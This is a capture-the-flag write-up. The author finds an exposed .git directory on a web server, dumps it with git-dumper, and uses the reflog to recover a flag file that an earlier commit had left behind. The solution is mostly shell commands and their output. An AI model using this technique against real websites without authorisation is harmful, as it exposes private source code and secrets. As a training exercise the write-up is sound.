## donut [100 pts]

**Category:** Misc
**Solves:** 160

## Description
Can you find your way around a git reposotory [sic]?

gitgoo.challs.pwnoh.io

### Solution

Visting the webpage, we see below hint:

```html
Can you find your way around a git reposotory [sic]? 
```

Ok, let's verify if there is any git repo available:

```bash
curl "https://gitgoo.challs.pwnoh.io/.git/HEAD"
ref: refs/heads/master
```

Ok seem the git repo is available. We should download files and look for flag.
I used git-dumper package to download `.git` files without having directory traversal enabled.

You can access this tool using link below:

https://github.com/arthaud/git-dumper

Now let's download files:

```bash
python git_dumper.py https://gitgoo.challs.pwnoh.io/.git output
```

The source files will be placed in `output` folder.

Let's look for the flag.
```
> cd output
> ls
app.py  Dockerfile  index.html

> ls -la
total 28
drwxr-xr-x 3 execut3 execut3 4096 Sep 28 16:22 ./
drwxr-xr-x 7 execut3 execut3 4096 Sep 28 16:22 ../
-rw-r--r-- 1 execut3 execut3  591 Sep 28 16:22 app.py
-rw-r--r-- 1 execut3 execut3  116 Sep 28 16:22 Dockerfile
drwxr-xr-x 7 execut3 execut3 4096 Sep 28 16:22 .git/
-rw-r--r-- 1 execut3 execut3  162 Sep 28 16:22 .gitignore
-rw-r--r-- 1 execut3 execut3   53 Sep 28 16:22 index.html

> git log
commit 391d507873dc7139d2420a8b492620db26912cdb (HEAD -> master)
Author: jm8 <jm8@pwnoh.io>
Date:   Sun Sep 22 13:42:54 2024 -0400

    Add app.py and Dockerfile but NOT flag

commit bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c
Author: jm8 <jm8@pwnoh.io>
Date:   Sun Sep 22 13:42:54 2024 -0400

    Initial commit (add index.html)

> cat .git/logs/HEAD 
0000000000000000000000000000000000000000 bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c jm8 <jm8@pwnoh.io> 1727026974 -0400	commit (initial): Initial commit (add index.html)
bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c 872e5099233f5d528ce3e60b4b197c9af17f784b jm8 <jm8@pwnoh.io> 1727026974 -0400	commit: Add app.py and Dockerfile
872e5099233f5d528ce3e60b4b197c9af17f784b 9b474236ba20cf3f7d484b76348de51c819c0d65 jm8 <jm8@pwnoh.io> 1727026974 -0400	commit: Accidentally commited flag :facepalm:
9b474236ba20cf3f7d484b76348de51c819c0d65 bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c jm8 <jm8@pwnoh.io> 1727026974 -0400	reset: moving to HEAD~~
bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c 391d507873dc7139d2420a8b492620db26912cdb jm8 <jm8@pwnoh.io> 1727026974 -0400	commit: Add app.py and Dockerfile but NOT flag
391d507873dc7139d2420a8b492620db26912cdb 391d507873dc7139d2420a8b492620db26912cdb jm8 <jm8@pwnoh.io> 1727528096 +0330	checkout: moving from master to 391d507873dc7139d2420a8b492620db26912cdb
391d507873dc7139d2420a8b492620db26912cdb bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c jm8 <jm8@pwnoh.io> 1727528117 +0330	checkout: moving from 391d507873dc7139d2420a8b492620db26912cdb to bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c
bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c 9b474236ba20cf3f7d484b76348de51c819c0d65 jm8 <jm8@pwnoh.io> 1727528206 +0330	checkout: moving from bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c to 9b474236ba20cf3f7d484b76348de51c819c0d65
9b474236ba20cf3f7d484b76348de51c819c0d65 bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c jm8 <jm8@pwnoh.io> 1727528213 +0330	checkout: moving from 9b474236ba20cf3f7d484b76348de51c819c0d65 to bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c
bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c 872e5099233f5d528ce3e60b4b197c9af17f784b jm8 <jm8@pwnoh.io> 1727528221 +0330	checkout: moving from bc97871a6f5453920882b0bbd97d8ac4fb2bcf9c to 872e5099233f5d528ce3e60b4b197c9af17f784b
```

let's revert to commit `872e5099233f5d528ce3e60b4b197c9af17f784b`.

```bash
> git checkout 872e5099233f5d528ce3e60b4b197c9af17f784b
Previous HEAD position was bc97871 Initial commit (add index.html)
HEAD is now at 872e509 Add app.py and Dockerfile

> ls
app.py  Dockerfile  flag.txt  index.html

> cat flag.txt 
bctf{flaghere}
```
